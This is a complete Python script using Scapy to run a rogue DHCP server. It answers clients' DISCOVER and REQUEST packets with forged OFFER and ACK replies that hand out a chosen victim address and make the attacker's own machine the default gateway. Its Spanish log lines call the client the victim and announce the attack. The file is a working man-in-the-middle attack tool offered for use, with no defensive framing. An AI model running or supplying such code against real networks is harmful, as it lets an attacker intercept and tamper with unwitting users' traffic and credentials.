#!/usr/bin/env python3
import argparse
import logging
from scapy.all import *

conf.checkIPaddr = False
conf.verb = 0
logging.basicConfig(format='[%(asctime)s] ROGUE: %(message)s', level=logging.INFO, datefmt='%H:%M:%S')

class RogueServer:
    def __init__(self, iface, my_ip, victim_ip):
        self.iface = iface
        self.my_ip = my_ip
        self.offer_ip = victim_ip
        self.mac = get_if_hwaddr(iface)

    def start(self):
        logging.info(f"ESCUCHANDO EN {self.iface} (IP Falsa: {self.offer_ip})")
        sniff(iface=self.iface, filter="udp and (port 67 or 68)", prn=self.handle, store=0)

    def handle(self, pkt):
        if DHCP in pkt and pkt[DHCP].options[0][1] == 1: # DISCOVER
            logging.info(f"DISCOVER de {pkt[Ether].src} -> ATACANDO")
            
            # Respuesta DHCP OFFER agresiva
            offer = Ether(src=self.mac, dst="ff:ff:ff:ff:ff:ff") / \
                    IP(src=self.my_ip, dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    BOOTP(op=2, yiaddr=self.offer_ip, siaddr=self.my_ip, 
                          chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
                    DHCP(options=[("message-type", "offer"), 
                                  ("server_id", self.my_ip),
                                  ("subnet_mask", "255.255.255.192"), # TU MÁSCARA /26
                                  ("router", self.my_ip),             # GATEWAY = TU KALI
                                  ("lease_time", 3600),
                                  ("name_server", "8.8.8.8"),
                                  "end"])
            sendp(offer, iface=self.iface, verbose=False)

        elif DHCP in pkt and pkt[DHCP].options[0][1] == 3: # REQUEST
             logging.info("REQUEST recibido -> ENVIANDO ACK (VICTIMA CAYÓ)")
             ack = Ether(src=self.mac, dst="ff:ff:ff:ff:ff:ff") / \
                   IP(src=self.my_ip, dst="255.255.255.255") / \
                   UDP(sport=67, dport=68) / \
                   BOOTP(op=2, yiaddr=self.offer_ip, siaddr=self.my_ip, 
                         chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
                   DHCP(options=[("message-type", "ack"), 
                                 ("server_id", self.my_ip),
                                 ("subnet_mask", "255.255.255.192"),
                                 ("router", self.my_ip),
                                 "end"])
             sendp(ack, iface=self.iface, verbose=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("--my-ip", required=True)
    parser.add_argument("--victim-ip", default="10.14.89.20")
    args = parser.parse_args()
    RogueServer(args.iface, args.my_ip, args.victim_ip).start()